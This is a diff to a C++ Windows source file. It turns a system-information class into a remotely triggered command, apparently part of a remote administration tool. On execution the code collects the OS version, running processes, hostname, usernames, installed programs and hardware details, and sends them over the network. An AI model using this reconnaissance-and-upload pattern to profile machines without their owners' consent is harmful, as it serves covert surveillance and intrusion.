@@ -1,23 +1,25 @@
 #include "stdafx.h"
-#include "Info.h"
+#include "Command_info.h"
+#include "Network.h"
+#include "Settings.h"
 #include "Util.h"
 #include <functiondiscoverykeys_devpkey.h>
 
-// Use to convert bytes to MB
+// Used to convert bytes to MB
 #define DIV 1048576
-
-Info info;
 
 #define SAFE_RELEASE(p) if(p) { p->Release(); p = NULL; }
 
+DWORD Command_info::dwLastProcessTime = 0;
+DWORD Command_info::dwLastSystemTime = 0;
+double Command_info::dCPULoad = 0.0;
 
-Info::Info() : dwLastProcessTime(0), dwLastSystemTime(0), dCPULoad(0)
+Command_info::Command_info()
 {
-	// Has to be called atleast one time until we can use its value
 	std::tstring dummy;
 	HRESULT hr;
 
-	this->GetCPULoad(dummy);
+	GetCPULoad(dummy);
 
 	hr = CoInitializeEx(0, COINITBASE_MULTITHREADED);
 	if(FAILED(hr)) {
@@ -25,11 +27,21 @@ Info::Info() : dwLastProcessTime(0), dwLastSystemTime(0), dCPULoad(0)
 	}
 }
 
-Info::~Info()
+Command_info::~Command_info()
 {
+	CoUninitialize();
 }
 
-void Info::GetInformation(std::tstring& str)
+bool Command_info::OnExecute(const std::vector<std::tstring> &args)
+{
+	std::tstring info = _T("i=");
+
+	GetInformation(info);
+	network.SendText(V_NET_FILE_DATA, Util::t2s(info).c_str());
+	return true;
+}
+
+void Command_info::GetInformation(std::tstring& str)
 {
 	str += _T("osVer:");
 	this->GetOSVersion(str);
@@ -84,7 +96,7 @@ void Info::GetInformation(std::tstring& str)
 	str += _T("\n");
 }
 
-bool Info::GetOSVersion(std::tstring& str)
+bool Command_info::GetOSVersion(std::tstring& str)
 {
 	OSVERSIONINFO osVersionInfo;
 
@@ -102,7 +114,7 @@ bool Info::GetOSVersion(std::tstring& str)
 
 	return true;
 }
-bool Info::GetProcessInfoStr(DWORD processID, std::tstring& str)
+bool Command_info::GetProcessInfoStr(DWORD processID, std::tstring& str)
 {
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
 		FALSE, processID);
@@ -114,9 +126,9 @@ bool Info::GetProcessInfoStr(DWORD processID, std::tstring& str)
 	HMODULE hMod;
 	DWORD bytesNeeded;
 
-	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
+	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
 		TCHAR processName[MAX_PATH];
-		if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
+		if(GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
 			str += processName;
 			return true;
 		}
@@ -124,7 +136,7 @@ bool Info::GetProcessInfoStr(DWORD processID, std::tstring& str)
 
 	return false;
 }
-bool Info::EnumerateProcesses(std::tstring& str)
+bool Command_info::EnumerateProcesses(std::tstring& str)
 {
 	DWORD processes[1024];
 	DWORD bytesNeeded;
@@ -148,7 +160,7 @@ bool Info::EnumerateProcesses(std::tstring& str)
 	return true;
 }
 
-bool Info::GetHostname(std::tstring& str)
+bool Command_info::GetHostname(std::tstring& str)
 {
 	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD size;
@@ -156,13 +168,14 @@ bool Info::GetHostname(std::tstring& str)
 	if(GetComputerName(buffer, &size) != 0) {
 		str += std::tstring(buffer, size);
 		return true;
-	} else {
+	}
+	else {
 		str += _T("unknown");
 		return false;
 	}
 }
 
-bool Info::GetTime(std::tstring &str)
+bool Command_info::GetTime(std::tstring &str)
 {
 	SYSTEMTIME sysTime;
 
@@ -173,7 +186,7 @@ bool Info::GetTime(std::tstring &str)
 	str += _T(".");
 	str += std::to_tstring(sysTime.wMonth);
 	str += _T("."),
-	str += std::to_tstring(sysTime.wYear);
+		str += std::to_tstring(sysTime.wYear);
 	str += _T(" ");
 	str += std::to_tstring(sysTime.wHour);
 	str += _T(":");
@@ -184,12 +197,12 @@ bool Info::GetTime(std::tstring &str)
 	return true;
 }
 
-bool Info::GetMemoryStatus(std::tstring& str)
+bool Command_info::GetMemoryStatus(std::tstring& str)
 {
 	MEMORYSTATUSEX statex;
 	statex.dwLength = sizeof(statex);
 
-	if (GlobalMemoryStatusEx(&statex)) {
+	if(GlobalMemoryStatusEx(&statex)) {
 		str += _T("total:");
 		str += std::to_tstring(statex.ullTotalPhys / DIV);
 		str += _T(";");
@@ -197,14 +210,15 @@ bool Info::GetMemoryStatus(std::tstring& str)
 		str += _T("free:");
 		str += std::to_tstring(statex.ullAvailPhys / DIV);
 		str += _T(";");
-		
+
 		return true;
-	} else {
+	}
+	else {
 		return false;
 	}
 }
 
-bool Info::GetCPULoad(std::tstring& str)
+bool Command_info::GetCPULoad(std::tstring& str)
 {
 	FILETIME ftCreationTime, ftExitTime, ftKernelTime, ftUserTime;
 	ULARGE_INTEGER uiKernelTime, uiUserTime;
@@ -230,7 +244,7 @@ bool Info::GetCPULoad(std::tstring& str)
 	return true;
 }
 
-bool Info::GetUsernameReal(std::tstring& str)
+bool Command_info::GetUsernameReal(std::tstring& str)
 {
 	TCHAR buffer[1024] = { 0 };
 	ULONG size = sizeof(buffer);
@@ -238,13 +252,14 @@ bool Info::GetUsernameReal(std::tstring& str)
 	if(GetUserNameEx(NameDisplay, buffer, &size)) {
 		str += std::tstring(buffer, size);
 		return true;
-	} else {
+	}
+	else {
 		str += _T("unknown");
 		return false;
 	}
 }
 
-bool Info::GetUsernameLogin(std::tstring& str)
+bool Command_info::GetUsernameLogin(std::tstring& str)
 {
 	TCHAR buffer[1024] = { 0 };
 	ULONG size = sizeof(buffer);
@@ -252,13 +267,14 @@ bool Info::GetUsernameLogin(std::tstring& str)
 	if(GetUserName(buffer, &size) == 0) {
 		str += std::tstring(buffer, size);
 		return true;
-	} else {
+	}
+	else {
 		str += _T("unknown");
 		return false;
 	}
 }
 
-bool Info::GetProgramList(std::tstring& str)
+bool Command_info::GetProgramList(std::tstring& str)
 {
 	HKEY hKey = { 0 };
 	LPCTSTR path = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
@@ -296,7 +312,7 @@ bool Info::GetProgramList(std::tstring& str)
 	return true;
 }
 
-bool Info::GetCPUInfo(std::tstring &str)
+bool Command_info::GetCPUInfo(std::tstring &str)
 {
 	HKEY hKey = { 0 };
 	LPCTSTR path = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
@@ -320,7 +336,7 @@ bool Info::GetCPUInfo(std::tstring &str)
 	return true;
 }
 
-bool Info::GetRAMInfo(std::tstring &str)
+bool Command_info::GetRAMInfo(std::tstring &str)
 {
 	unsigned long long memory = 0;
 
@@ -333,7 +349,7 @@ bool Info::GetRAMInfo(std::tstring &str)
 	return false;
 }
 
-bool Info::GetDisplayDeviceInfo(std::tstring &str)
+bool Command_info::GetDisplayDeviceInfo(std::tstring &str)
 {
 	DISPLAY_DEVICE diDev;
 
@@ -347,7 +363,7 @@ bool Info::GetDisplayDeviceInfo(std::tstring &str)
 	return false;
 }
 
-bool Info::GetAudioDeviceInfo(std::tstring &str)
+bool Command_info::GetAudioDeviceInfo(std::tstring &str)
 {
 	bool ret = true;
 	HRESULT hr = S_OK;
